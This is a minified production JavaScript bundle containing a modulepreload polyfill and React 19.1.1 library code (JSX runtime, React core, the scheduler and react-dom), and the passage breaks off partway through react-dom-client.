(function () {
	const d = document.createElement("link").relList;
	if (d && d.supports && d.supports("modulepreload")) return;
	for (const h of document.querySelectorAll('link[rel="modulepreload"]'))
		r(h);
	new MutationObserver((h) => {
		for (const v of h)
			if (v.type === "childList")
				for (const N of v.addedNodes)
					N.tagName === "LINK" && N.rel === "modulepreload" && r(N);
	}).observe(document, { childList: !0, subtree: !0 });
	function o(h) {
		const v = {};
		return (
			h.integrity && (v.integrity = h.integrity),
			h.referrerPolicy && (v.referrerPolicy = h.referrerPolicy),
			h.crossOrigin === "use-credentials"
				? (v.credentials = "include")
				: h.crossOrigin === "anonymous"
				? (v.credentials = "omit")
				: (v.credentials = "same-origin"),
			v
		);
	}
	function r(h) {
		if (h.ep) return;
		h.ep = !0;
		const v = o(h);
		fetch(h.href, v);
	}
})();
var xc = { exports: {} },
	N1 = {};
/**
 * @license React
 * react-jsx-runtime.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var T2;
function w0() {
	if (T2) return N1;
	T2 = 1;
	var c = Symbol.for("react.transitional.element"),
		d = Symbol.for("react.fragment");
	function o(r, h, v) {
		var N = null;
		if (
			(v !== void 0 && (N = "" + v),
			h.key !== void 0 && (N = "" + h.key),
			"key" in h)
		) {
			v = {};
			for (var z in h) z !== "key" && (v[z] = h[z]);
		} else v = h;
		return (
			(h = v.ref),
			{
				$$typeof: c,
				type: r,
				key: N,
				ref: h !== void 0 ? h : null,
				props: v,
			}
		);
	}
	return (N1.Fragment = d), (N1.jsx = o), (N1.jsxs = o), N1;
}
var A2;
function M0() {
	return A2 || ((A2 = 1), (xc.exports = w0())), xc.exports;
}
var f = M0(),
	gc = { exports: {} },
	ee = {};
/**
 * @license React
 * react.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var w2;
function O0() {
	if (w2) return ee;
	w2 = 1;
	var c = Symbol.for("react.transitional.element"),
		d = Symbol.for("react.portal"),
		o = Symbol.for("react.fragment"),
		r = Symbol.for("react.strict_mode"),
		h = Symbol.for("react.profiler"),
		v = Symbol.for("react.consumer"),
		N = Symbol.for("react.context"),
		z = Symbol.for("react.forward_ref"),
		b = Symbol.for("react.suspense"),
		p = Symbol.for("react.memo"),
		w = Symbol.for("react.lazy"),
		D = Symbol.iterator;
	function U(x) {
		return x === null || typeof x != "object"
			? null
			: ((x = (D && x[D]) || x["@@iterator"]),
			  typeof x == "function" ? x : null);
	}
	var J = {
			isMounted: function () {
				return !1;
			},
			enqueueForceUpdate: function () {},
			enqueueReplaceState: function () {},
			enqueueSetState: function () {},
		},
		X = Object.assign,
		Q = {};
	function G(x, _, q) {
		(this.props = x),
			(this.context = _),
			(this.refs = Q),
			(this.updater = q || J);
	}
	(G.prototype.isReactComponent = {}),
		(G.prototype.setState = function (x, _) {
			if (typeof x != "object" && typeof x != "function" && x != null)
				throw Error(
					"takes an object of state variables to update or a function which returns an object of state variables."
				);
			this.updater.enqueueSetState(this, x, _, "setState");
		}),
		(G.prototype.forceUpdate = function (x) {
			this.updater.enqueueForceUpdate(this, x, "forceUpdate");
		});
	function H() {}
	H.prototype = G.prototype;
	function ie(x, _, q) {
		(this.props = x),
			(this.context = _),
			(this.refs = Q),
			(this.updater = q || J);
	}
	var I = (ie.prototype = new H());
	(I.constructor = ie), X(I, G.prototype), (I.isPureReactComponent = !0);
	var be = Array.isArray,
		F = { H: null, A: null, T: null, S: null, V: null },
		_e = Object.prototype.hasOwnProperty;
	function Oe(x, _, q, L, V, ce) {
		return (
			(q = ce.ref),
			{
				$$typeof: c,
				type: x,
				key: _,
				ref: q !== void 0 ? q : null,
				props: ce,
			}
		);
	}
	function De(x, _) {
		return Oe(x.type, _, void 0, void 0, void 0, x.props);
	}
	function Ee(x) {
		return typeof x == "object" && x !== null && x.$$typeof === c;
	}
	function Ie(x) {
		var _ = { "=": "=0", ":": "=2" };
		return (
			"$" +
			x.replace(/[=:]/g, function (q) {
				return _[q];
			})
		);
	}
	var rt = /\/+/g;
	function Ze(x, _) {
		return typeof x == "object" && x !== null && x.key != null
			? Ie("" + x.key)
			: _.toString(36);
	}
	function bl() {}
	function Cl(x) {
		switch (x.status) {
			case "fulfilled":
				return x.value;
			case "rejected":
				throw x.reason;
			default:
				switch (
					(typeof x.status == "string"
						? x.then(bl, bl)
						: ((x.status = "pending"),
						  x.then(
								function (_) {
									x.status === "pending" &&
										((x.status = "fulfilled"),
										(x.value = _));
								},
								function (_) {
									x.status === "pending" &&
										((x.status = "rejected"),
										(x.reason = _));
								}
						  )),
					x.status)
				) {
					case "fulfilled":
						return x.value;
					case "rejected":
						throw x.reason;
				}
		}
		throw x;
	}
	function Xe(x, _, q, L, V) {
		var ce = typeof x;
		(ce === "undefined" || ce === "boolean") && (x = null);
		var P = !1;
		if (x === null) P = !0;
		else
			switch (ce) {
				case "bigint":
				case "string":
				case "number":
					P = !0;
					break;
				case "object":
					switch (x.$$typeof) {
						case c:
						case d:
							P = !0;
							break;
						case w:
							return (P = x._init), Xe(P(x._payload), _, q, L, V);
					}
			}
		if (P)
			return (
				(V = V(x)),
				(P = L === "" ? "." + Ze(x, 0) : L),
				be(V)
					? ((q = ""),
					  P != null && (q = P.replace(rt, "$&/") + "/"),
					  Xe(V, _, q, "", function ($t) {
							return $t;
					  }))
					: V != null &&
					  (Ee(V) &&
							(V = De(
								V,
								q +
									(V.key == null || (x && x.key === V.key)
										? ""
										: ("" + V.key).replace(rt, "$&/") +
										  "/") +
									P
							)),
					  _.push(V)),
				1
			);
		P = 0;
		var et = L === "" ? "." : L + ":";
		if (be(x))
			for (var ve = 0; ve < x.length; ve++)
				(L = x[ve]), (ce = et + Ze(L, ve)), (P += Xe(L, _, q, ce, V));
		else if (((ve = U(x)), typeof ve == "function"))
			for (x = ve.call(x), ve = 0; !(L = x.next()).done; )
				(L = L.value),
					(ce = et + Ze(L, ve++)),
					(P += Xe(L, _, q, ce, V));
		else if (ce === "object") {
			if (typeof x.then == "function") return Xe(Cl(x), _, q, L, V);
			throw (
				((_ = String(x)),
				Error(
					"Objects are not valid as a React child (found: " +
						(_ === "[object Object]"
							? "object with keys {" +
							  Object.keys(x).join(", ") +
							  "}"
							: _) +
						"). If you meant to render a collection of children, use an array instead."
				))
			);
		}
		return P;
	}
	function M(x, _, q) {
		if (x == null) return x;
		var L = [],
			V = 0;
		return (
			Xe(x, L, "", "", function (ce) {
				return _.call(q, ce, V++);
			}),
			L
		);
	}
	function B(x) {
		if (x._status === -1) {
			var _ = x._result;
			(_ = _()),
				_.then(
					function (q) {
						(x._status === 0 || x._status === -1) &&
							((x._status = 1), (x._result = q));
					},
					function (q) {
						(x._status === 0 || x._status === -1) &&
							((x._status = 2), (x._result = q));
					}
				),
				x._status === -1 && ((x._status = 0), (x._result = _));
		}
		if (x._status === 1) return x._result.default;
		throw x._result;
	}
	var $ =
		typeof reportError == "function"
			? reportError
			: function (x) {
					if (
						typeof window == "object" &&
						typeof window.ErrorEvent == "function"
					) {
						var _ = new window.ErrorEvent("error", {
							bubbles: !0,
							cancelable: !0,
							message:
								typeof x == "object" &&
								x !== null &&
								typeof x.message == "string"
									? String(x.message)
									: String(x),
							error: x,
						});
						if (!window.dispatchEvent(_)) return;
					} else if (
						typeof process == "object" &&
						typeof process.emit == "function"
					) {
						process.emit("uncaughtException", x);
						return;
					}
					console.error(x);
			  };
	function pe() {}
	return (
		(ee.Children = {
			map: M,
			forEach: function (x, _, q) {
				M(
					x,
					function () {
						_.apply(this, arguments);
					},
					q
				);
			},
			count: function (x) {
				var _ = 0;
				return (
					M(x, function () {
						_++;
					}),
					_
				);
			},
			toArray: function (x) {
				return (
					M(x, function (_) {
						return _;
					}) || []
				);
			},
			only: function (x) {
				if (!Ee(x))
					throw Error(
						"React.Children.only expected to receive a single React element child."
					);
				return x;
			},
		}),
		(ee.Component = G),
		(ee.Fragment = o),
		(ee.Profiler = h),
		(ee.PureComponent = ie),
		(ee.StrictMode = r),
		(ee.Suspense = b),
		(ee.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE =
			F),
		(ee.__COMPILER_RUNTIME = {
			__proto__: null,
			c: function (x) {
				return F.H.useMemoCache(x);
			},
		}),
		(ee.cache = function (x) {
			return function () {
				return x.apply(null, arguments);
			};
		}),
		(ee.cloneElement = function (x, _, q) {
			if (x == null)
				throw Error(
					"The argument must be a React element, but you passed " +
						x +
						"."
				);
			var L = X({}, x.props),
				V = x.key,
				ce = void 0;
			if (_ != null)
				for (P in (_.ref !== void 0 && (ce = void 0),
				_.key !== void 0 && (V = "" + _.key),
				_))
					!_e.call(_, P) ||
						P === "key" ||
						P === "__self" ||
						P === "__source" ||
						(P === "ref" && _.ref === void 0) ||
						(L[P] = _[P]);
			var P = arguments.length - 2;
			if (P === 1) L.children = q;
			else if (1 < P) {
				for (var et = Array(P), ve = 0; ve < P; ve++)
					et[ve] = arguments[ve + 2];
				L.children = et;
			}
			return Oe(x.type, V, void 0, void 0, ce, L);
		}),
		(ee.createContext = function (x) {
			return (
				(x = {
					$$typeof: N,
					_currentValue: x,
					_currentValue2: x,
					_threadCount: 0,
					Provider: null,
					Consumer: null,
				}),
				(x.Provider = x),
				(x.Consumer = { $$typeof: v, _context: x }),
				x
			);
		}),
		(ee.createElement = function (x, _, q) {
			var L,
				V = {},
				ce = null;
			if (_ != null)
				for (L in (_.key !== void 0 && (ce = "" + _.key), _))
					_e.call(_, L) &&
						L !== "key" &&
						L !== "__self" &&
						L !== "__source" &&
						(V[L] = _[L]);
			var P = arguments.length - 2;
			if (P === 1) V.children = q;
			else if (1 < P) {
				for (var et = Array(P), ve = 0; ve < P; ve++)
					et[ve] = arguments[ve + 2];
				V.children = et;
			}
			if (x && x.defaultProps)
				for (L in ((P = x.defaultProps), P))
					V[L] === void 0 && (V[L] = P[L]);
			return Oe(x, ce, void 0, void 0, null, V);
		}),
		(ee.createRef = function () {
			return { current: null };
		}),
		(ee.forwardRef = function (x) {
			return { $$typeof: z, render: x };
		}),
		(ee.isValidElement = Ee),
		(ee.lazy = function (x) {
			return {
				$$typeof: w,
				_payload: { _status: -1, _result: x },
				_init: B,
			};
		}),
		(ee.memo = function (x, _) {
			return { $$typeof: p, type: x, compare: _ === void 0 ? null : _ };
		}),
		(ee.startTransition = function (x) {
			var _ = F.T,
				q = {};
			F.T = q;
			try {
				var L = x(),
					V = F.S;
				V !== null && V(q, L),
					typeof L == "object" &&
						L !== null &&
						typeof L.then == "function" &&
						L.then(pe, $);
			} catch (ce) {
				$(ce);
			} finally {
				F.T = _;
			}
		}),
		(ee.unstable_useCacheRefresh = function () {
			return F.H.useCacheRefresh();
		}),
		(ee.use = function (x) {
			return F.H.use(x);
		}),
		(ee.useActionState = function (x, _, q) {
			return F.H.useActionState(x, _, q);
		}),
		(ee.useCallback = function (x, _) {
			return F.H.useCallback(x, _);
		}),
		(ee.useContext = function (x) {
			return F.H.useContext(x);
		}),
		(ee.useDebugValue = function () {}),
		(ee.useDeferredValue = function (x, _) {
			return F.H.useDeferredValue(x, _);
		}),
		(ee.useEffect = function (x, _, q) {
			var L = F.H;
			if (typeof q == "function")
				throw Error(
					"useEffect CRUD overload is not enabled in this build of React."
				);
			return L.useEffect(x, _);
		}),
		(ee.useId = function () {
			return F.H.useId();
		}),
		(ee.useImperativeHandle = function (x, _, q) {
			return F.H.useImperativeHandle(x, _, q);
		}),
		(ee.useInsertionEffect = function (x, _) {
			return F.H.useInsertionEffect(x, _);
		}),
		(ee.useLayoutEffect = function (x, _) {
			return F.H.useLayoutEffect(x, _);
		}),
		(ee.useMemo = function (x, _) {
			return F.H.useMemo(x, _);
		}),
		(ee.useOptimistic = function (x, _) {
			return F.H.useOptimistic(x, _);
		}),
		(ee.useReducer = function (x, _, q) {
			return F.H.useReducer(x, _, q);
		}),
		(ee.useRef = function (x) {
			return F.H.useRef(x);
		}),
		(ee.useState = function (x) {
			return F.H.useState(x);
		}),
		(ee.useSyncExternalStore = function (x, _, q) {
			return F.H.useSyncExternalStore(x, _, q);
		}),
		(ee.useTransition = function () {
			return F.H.useTransition();
		}),
		(ee.version = "19.1.1"),
		ee
	);
}
var M2;
function Tc() {
	return M2 || ((M2 = 1), (gc.exports = O0())), gc.exports;
}
var A = Tc(),
	vc = { exports: {} },
	T1 = {},
	yc = { exports: {} },
	bc = {};
/**
 * @license React
 * scheduler.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var O2;
function R0() {
	return (
		O2 ||
			((O2 = 1),
			(function (c) {
				function d(M, B) {
					var $ = M.length;
					M.push(B);
					e: for (; 0 < $; ) {
						var pe = ($ - 1) >>> 1,
							x = M[pe];
						if (0 < h(x, B)) (M[pe] = B), (M[$] = x), ($ = pe);
						else break e;
					}
				}
				function o(M) {
					return M.length === 0 ? null : M[0];
				}
				function r(M) {
					if (M.length === 0) return null;
					var B = M[0],
						$ = M.pop();
					if ($ !== B) {
						M[0] = $;
						e: for (
							var pe = 0, x = M.length, _ = x >>> 1;
							pe < _;

						) {
							var q = 2 * (pe + 1) - 1,
								L = M[q],
								V = q + 1,
								ce = M[V];
							if (0 > h(L, $))
								V < x && 0 > h(ce, L)
									? ((M[pe] = ce), (M[V] = $), (pe = V))
									: ((M[pe] = L), (M[q] = $), (pe = q));
							else if (V < x && 0 > h(ce, $))
								(M[pe] = ce), (M[V] = $), (pe = V);
							else break e;
						}
					}
					return B;
				}
				function h(M, B) {
					var $ = M.sortIndex - B.sortIndex;
					return $ !== 0 ? $ : M.id - B.id;
				}
				if (
					((c.unstable_now = void 0),
					typeof performance == "object" &&
						typeof performance.now == "function")
				) {
					var v = performance;
					c.unstable_now = function () {
						return v.now();
					};
				} else {
					var N = Date,
						z = N.now();
					c.unstable_now = function () {
						return N.now() - z;
					};
				}
				var b = [],
					p = [],
					w = 1,
					D = null,
					U = 3,
					J = !1,
					X = !1,
					Q = !1,
					G = !1,
					H = typeof setTimeout == "function" ? setTimeout : null,
					ie =
						typeof clearTimeout == "function" ? clearTimeout : null,
					I = typeof setImmediate < "u" ? setImmediate : null;
				function be(M) {
					for (var B = o(p); B !== null; ) {
						if (B.callback === null) r(p);
						else if (B.startTime <= M)
							r(p), (B.sortIndex = B.expirationTime), d(b, B);
						else break;
						B = o(p);
					}
				}
				function F(M) {
					if (((Q = !1), be(M), !X))
						if (o(b) !== null) (X = !0), _e || ((_e = !0), Ze());
						else {
							var B = o(p);
							B !== null && Xe(F, B.startTime - M);
						}
				}
				var _e = !1,
					Oe = -1,
					De = 5,
					Ee = -1;
				function Ie() {
					return G ? !0 : !(c.unstable_now() - Ee < De);
				}
				function rt() {
					if (((G = !1), _e)) {
						var M = c.unstable_now();
						Ee = M;
						var B = !0;
						try {
							e: {
								(X = !1),
									Q && ((Q = !1), ie(Oe), (Oe = -1)),
									(J = !0);
								var $ = U;
								try {
									t: {
										for (
											be(M), D = o(b);
											D !== null &&
											!(D.expirationTime > M && Ie());

										) {
											var pe = D.callback;
											if (typeof pe == "function") {
												(D.callback = null),
													(U = D.priorityLevel);
												var x = pe(
													D.expirationTime <= M
												);
												if (
													((M = c.unstable_now()),
													typeof x == "function")
												) {
													(D.callback = x),
														be(M),
														(B = !0);
													break t;
												}
												D === o(b) && r(b), be(M);
											} else r(b);
											D = o(b);
										}
										if (D !== null) B = !0;
										else {
											var _ = o(p);
											_ !== null &&
												Xe(F, _.startTime - M),
												(B = !1);
										}
									}
									break e;
								} finally {
									(D = null), (U = $), (J = !1);
								}
								B = void 0;
							}
						} finally {
							B ? Ze() : (_e = !1);
						}
					}
				}
				var Ze;
				if (typeof I == "function")
					Ze = function () {
						I(rt);
					};
				else if (typeof MessageChannel < "u") {
					var bl = new MessageChannel(),
						Cl = bl.port2;
					(bl.port1.onmessage = rt),
						(Ze = function () {
							Cl.postMessage(null);
						});
				} else
					Ze = function () {
						H(rt, 0);
					};
				function Xe(M, B) {
					Oe = H(function () {
						M(c.unstable_now());
					}, B);
				}
				(c.unstable_IdlePriority = 5),
					(c.unstable_ImmediatePriority = 1),
					(c.unstable_LowPriority = 4),
					(c.unstable_NormalPriority = 3),
					(c.unstable_Profiling = null),
					(c.unstable_UserBlockingPriority = 2),
					(c.unstable_cancelCallback = function (M) {
						M.callback = null;
					}),
					(c.unstable_forceFrameRate = function (M) {
						0 > M || 125 < M
							? console.error(
									"forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"
							  )
							: (De = 0 < M ? Math.floor(1e3 / M) : 5);
					}),
					(c.unstable_getCurrentPriorityLevel = function () {
						return U;
					}),
					(c.unstable_next = function (M) {
						switch (U) {
							case 1:
							case 2:
							case 3:
								var B = 3;
								break;
							default:
								B = U;
						}
						var $ = U;
						U = B;
						try {
							return M();
						} finally {
							U = $;
						}
					}),
					(c.unstable_requestPaint = function () {
						G = !0;
					}),
					(c.unstable_runWithPriority = function (M, B) {
						switch (M) {
							case 1:
							case 2:
							case 3:
							case 4:
							case 5:
								break;
							default:
								M = 3;
						}
						var $ = U;
						U = M;
						try {
							return B();
						} finally {
							U = $;
						}
					}),
					(c.unstable_scheduleCallback = function (M, B, $) {
						var pe = c.unstable_now();
						switch (
							(typeof $ == "object" && $ !== null
								? (($ = $.delay),
								  ($ =
										typeof $ == "number" && 0 < $
											? pe + $
											: pe))
								: ($ = pe),
							M)
						) {
							case 1:
								var x = -1;
								break;
							case 2:
								x = 250;
								break;
							case 5:
								x = 1073741823;
								break;
							case 4:
								x = 1e4;
								break;
							default:
								x = 5e3;
						}
						return (
							(x = $ + x),
							(M = {
								id: w++,
								callback: B,
								priorityLevel: M,
								startTime: $,
								expirationTime: x,
								sortIndex: -1,
							}),
							$ > pe
								? ((M.sortIndex = $),
								  d(p, M),
								  o(b) === null &&
										M === o(p) &&
										(Q ? (ie(Oe), (Oe = -1)) : (Q = !0),
										Xe(F, $ - pe)))
								: ((M.sortIndex = x),
								  d(b, M),
								  X ||
										J ||
										((X = !0), _e || ((_e = !0), Ze()))),
							M
						);
					}),
					(c.unstable_shouldYield = Ie),
					(c.unstable_wrapCallback = function (M) {
						var B = U;
						return function () {
							var $ = U;
							U = B;
							try {
								return M.apply(this, arguments);
							} finally {
								U = $;
							}
						};
					});
			})(bc)),
		bc
	);
}
var R2;
function z0() {
	return R2 || ((R2 = 1), (yc.exports = R0())), yc.exports;
}
var Cc = { exports: {} },
	ke = {};
/**
 * @license React
 * react-dom.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var z2;
function _0() {
	if (z2) return ke;
	z2 = 1;
	var c = Tc();
	function d(b) {
		var p = "https://react.dev/errors/" + b;
		if (1 < arguments.length) {
			p += "?args[]=" + encodeURIComponent(arguments[1]);
			for (var w = 2; w < arguments.length; w++)
				p += "&args[]=" + encodeURIComponent(arguments[w]);
		}
		return (
			"Minified React error #" +
			b +
			"; visit " +
			p +
			" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
		);
	}
	function o() {}
	var r = {
			d: {
				f: o,
				r: function () {
					throw Error(d(522));
				},
				D: o,
				C: o,
				L: o,
				m: o,
				X: o,
				S: o,
				M: o,
			},
			p: 0,
			findDOMNode: null,
		},
		h = Symbol.for("react.portal");
	function v(b, p, w) {
		var D =
			3 < arguments.length && arguments[3] !== void 0
				? arguments[3]
				: null;
		return {
			$$typeof: h,
			key: D == null ? null : "" + D,
			children: b,
			containerInfo: p,
			implementation: w,
		};
	}
	var N = c.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;
	function z(b, p) {
		if (b === "font") return "";
		if (typeof p == "string") return p === "use-credentials" ? p : "";
	}
	return (
		(ke.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = r),
		(ke.createPortal = function (b, p) {
			var w =
				2 < arguments.length && arguments[2] !== void 0
					? arguments[2]
					: null;
			if (
				!p ||
				(p.nodeType !== 1 && p.nodeType !== 9 && p.nodeType !== 11)
			)
				throw Error(d(299));
			return v(b, p, null, w);
		}),
		(ke.flushSync = function (b) {
			var p = N.T,
				w = r.p;
			try {
				if (((N.T = null), (r.p = 2), b)) return b();
			} finally {
				(N.T = p), (r.p = w), r.d.f();
			}
		}),
		(ke.preconnect = function (b, p) {
			typeof b == "string" &&
				(p
					? ((p = p.crossOrigin),
					  (p =
							typeof p == "string"
								? p === "use-credentials"
									? p
									: ""
								: void 0))
					: (p = null),
				r.d.C(b, p));
		}),
		(ke.prefetchDNS = function (b) {
			typeof b == "string" && r.d.D(b);
		}),
		(ke.preinit = function (b, p) {
			if (typeof b == "string" && p && typeof p.as == "string") {
				var w = p.as,
					D = z(w, p.crossOrigin),
					U = typeof p.integrity == "string" ? p.integrity : void 0,
					J =
						typeof p.fetchPriority == "string"
							? p.fetchPriority
							: void 0;
				w === "style"
					? r.d.S(
							b,
							typeof p.precedence == "string"
								? p.precedence
								: void 0,
							{ crossOrigin: D, integrity: U, fetchPriority: J }
					  )
					: w === "script" &&
					  r.d.X(b, {
							crossOrigin: D,
							integrity: U,
							fetchPriority: J,
							nonce:
								typeof p.nonce == "string" ? p.nonce : void 0,
					  });
			}
		}),
		(ke.preinitModule = function (b, p) {
			if (typeof b == "string")
				if (typeof p == "object" && p !== null) {
					if (p.as == null || p.as === "script") {
						var w = z(p.as, p.crossOrigin);
						r.d.M(b, {
							crossOrigin: w,
							integrity:
								typeof p.integrity == "string"
									? p.integrity
									: void 0,
							nonce:
								typeof p.nonce == "string" ? p.nonce : void 0,
						});
					}
				} else p == null && r.d.M(b);
		}),
		(ke.preload = function (b, p) {
			if (
				typeof b == "string" &&
				typeof p == "object" &&
				p !== null &&
				typeof p.as == "string"
			) {
				var w = p.as,
					D = z(w, p.crossOrigin);
				r.d.L(b, w, {
					crossOrigin: D,
					integrity:
						typeof p.integrity == "string" ? p.integrity : void 0,
					nonce: typeof p.nonce == "string" ? p.nonce : void 0,
					type: typeof p.type == "string" ? p.type : void 0,
					fetchPriority:
						typeof p.fetchPriority == "string"
							? p.fetchPriority
							: void 0,
					referrerPolicy:
						typeof p.referrerPolicy == "string"
							? p.referrerPolicy
							: void 0,
					imageSrcSet:
						typeof p.imageSrcSet == "string"
							? p.imageSrcSet
							: void 0,
					imageSizes:
						typeof p.imageSizes == "string" ? p.imageSizes : void 0,
					media: typeof p.media == "string" ? p.media : void 0,
				});
			}
		}),
		(ke.preloadModule = function (b, p) {
			if (typeof b == "string")
				if (p) {
					var w = z(p.as, p.crossOrigin);
					r.d.m(b, {
						as:
							typeof p.as == "string" && p.as !== "script"
								? p.as
								: void 0,
						crossOrigin: w,
						integrity:
							typeof p.integrity == "string"
								? p.integrity
								: void 0,
					});
				} else r.d.m(b);
		}),
		(ke.requestFormReset = function (b) {
			r.d.r(b);
		}),
		(ke.unstable_batchedUpdates = function (b, p) {
			return b(p);
		}),
		(ke.useFormState = function (b, p, w) {
			return N.H.useFormState(b, p, w);
		}),
		(ke.useFormStatus = function () {
			return N.H.useHostTransitionStatus();
		}),
		(ke.version = "19.1.1"),
		ke
	);
}
var _2;
function D0() {
	if (_2) return Cc.exports;
	_2 = 1;
	function c() {
		if (
			!(
				typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" ||
				typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"
			)
		)
			try {
				__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(c);
			} catch (d) {
				console.error(d);
			}
	}
	return c(), (Cc.exports = _0()), Cc.exports;
}
/**
 * @license React
 * react-dom-client.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var D2;
function U0() {
	if (D2) return T1;
	D2 = 1;
	var c = z0(),
		d = Tc(),
		o = D0();
	function r(e) {
		var t = "https://react.dev/errors/" + e;
		if (1 < arguments.length) {
			t += "?args[]=" + encodeURIComponent(arguments[1]);
			for (var l = 2; l < arguments.length; l++)
				t += "&args[]=" + encodeURIComponent(arguments[l]);
		}
		return (
			"Minified React error #" +
			e +
			"; visit " +
			t +
			" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
		);
	}
	function h(e) {
		return !(
			!e ||
			(e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11)
		);
	}
	function v(e) {
		var t = e,
			l = e;
		if (e.alternate) for (; t.return; ) t = t.return;
		else {
			e = t;
			do
				(t = e),
					(t.flags & 4098) !== 0 && (l = t.return),
					(e = t.return);
			while (e);
		}
		return t.tag === 3 ? l : null;
	}
	function N(e) {
		if (e.tag === 13) {
			var t = e.memoizedState;
			if (
				(t === null &&
					((e = e.alternate), e !== null && (t = e.memoizedState)),
				t !== null)
			)
				return t.dehydrated;
		}
		return null;
	}
	function z(e) {
		if (v(e) !== e) throw Error(r(188));
	}
	function b(e) {
		var t = e.alternate;
		if (!t) {
			if (((t = v(e)), t === null)) throw Error(r(188));
			return t !== e ? null : e;
		}
		for (var l = e, a = t; ; ) {
			var n = l.return;
			if (n === null) break;
			var u = n.alternate;
			if (u === null) {
				if (((a = n.return), a !== null)) {
					l = a;
					continue;
				}
				break;
			}
			if (n.child === u.child) {
				for (u = n.child; u; ) {
					if (u === l) return z(n), e;
					if (u === a) return z(n), t;
					u = u.sibling;
				}
				throw Error(r(188));
			}
			if (l.return !== a.return) (l = n), (a = u);
			else {
				for (var i = !1, s = n.child; s; ) {
					if (s === l) {
						(i = !0), (l = n), (a = u);
						break;
					}
					if (s === a) {
						(i = !0), (a = n), (l = u);
						break;
					}
					s = s.sibling;
				}
				if (!i) {
					for (s = u.child; s; ) {
						if (s === l) {
							(i = !0), (l = u), (a = n);
							break;
						}
						if (s === a) {
							(i = !0), (a = u), (l = n);
							break;
						}
						s = s.sibling;
					}
					if (!i) throw Error(r(189));
				}
			}
			if (l.alternate !== a) throw Error(r(190));
		}
		if (l.tag !== 3) throw Error(r(188));
		return l.stateNode.current === l ? e : t;
	}
	function p(e) {
		var t = e.tag;
		if (t === 5 || t === 26 || t === 27 || t === 6) return e;
		for (e = e.child; e !== null; ) {
			if (((t = p(e)), t !== null)) return t;
			e = e.sibling;
		}
		return null;
	}
	var w = Object.assign,
		D = Symbol.for("react.element"),
		U = Symbol.for("react.transitional.element"),
		J = Symbol.for("react.portal"),
		X = Symbol.for("react.fragment"),
		Q = Symbol.for("react.strict_mode"),
		G = Symbol.for("react.profiler"),
		H = Symbol.for("react.provider"),
		ie = Symbol.for("react.consumer"),
		I = Symbol.for("react.context"),
		be = Symbol.for("react.forward_ref"),
		F = Symbol.for("react.suspense"),
		_e = Symbol.for("react.suspense_list"),
		Oe = Symbol.for("react.memo"),
		De = Symbol.for("react.lazy"),
		Ee = Symbol.for("react.activity"),
		Ie = Symbol.for("react.memo_cache_sentinel"),
		rt = Symbol.iterator;
	function Ze(e) {
		return e === null || typeof e != "object"
			? null
			: ((e = (rt && e[rt]) || e["@@iterator"]),
			  typeof e == "function" ? e : null);
	}
	var bl = Symbol.for("react.client.reference");
	function Cl(e) {
		if (e == null) return null;
		if (typeof e == "function")
			return e.$$typeof === bl ? null : e.displayName || e.name || null;
		if (typeof e == "string") return e;
		switch (e) {
			case X:
				return "Fragment";
			case G:
				return "Profiler";
			case Q:
				return "StrictMode";
			case F:
				return "Suspense";
			case _e:
				return "SuspenseList";
			case Ee:
				return "Activity";
		}
		if (typeof e == "object")
			switch (e.$$typeof) {
				case J:
					return "Portal";
				case I:
					return (e.displayName || "Context") + ".Provider";
				case ie:
					return (e._context.displayName || "Context") + ".Consumer";
				case be:
					var t = e.render;
					return (
						(e = e.displayName),
						e ||
							((e = t.displayName || t.name || ""),
							(e =
								e !== ""
									? "ForwardRef(" + e + ")"
									: "ForwardRef")),
						e
					);
				case Oe:
					return (
						(t = e.displayName || null),
						t !== null ? t : Cl(e.type) || "Memo"
					);
				case De:
					(t = e._payload), (e = e._init);
					try {
						return Cl(e(t));
					} catch {}
			}
		return null;
	}
	var Xe = Array.isArray,
		M = d.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,
		B = o.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,
		$ = { pending: !1, data: null, method: null, action: null },
		pe = [],
		x = -1;
	function _(e) {
		return { current: e };
	}
	function q(e) {
		0 > x || ((e.current = pe[x]), (pe[x] = null), x--);
	}
	function L(e, t) {
		x++, (pe[x] = e.current), (e.current = t);
	}
	var V = _(null),
		ce = _(null),
		P = _(null),
		et = _(null);
	function ve(e, t) {
		switch ((L(P, t), L(ce, e), L(V, null), t.nodeType)) {
			case 9:
			case 11:
				e = (e = t.documentElement) && (e = e.namespaceURI) ? e2(e) : 0;
				break;
			default:
				if (((e = t.tagName), (t = t.namespaceURI)))
					(t = e2(t)), (e = t2(t, e));
				else
					switch (e) {
						case "svg":
							e = 1;
							break;
						case "math":
							e = 2;
							break;
						default:
							e = 0;
					}
		}
		q(V), L(V, e);
	}
	function $t() {
		q(V), q(ce), q(P);
	}
	function tu(e) {
		e.memoizedState !== null && L(et, e);
		var t = V.current,
			l = t2(t, e.type);
		t !== l && (L(ce, e), L(V, l));
	}
	function _1(e) {
		ce.current === e && (q(V), q(ce)),
			et.current === e && (q(et), (b1._currentValue = $));
	}
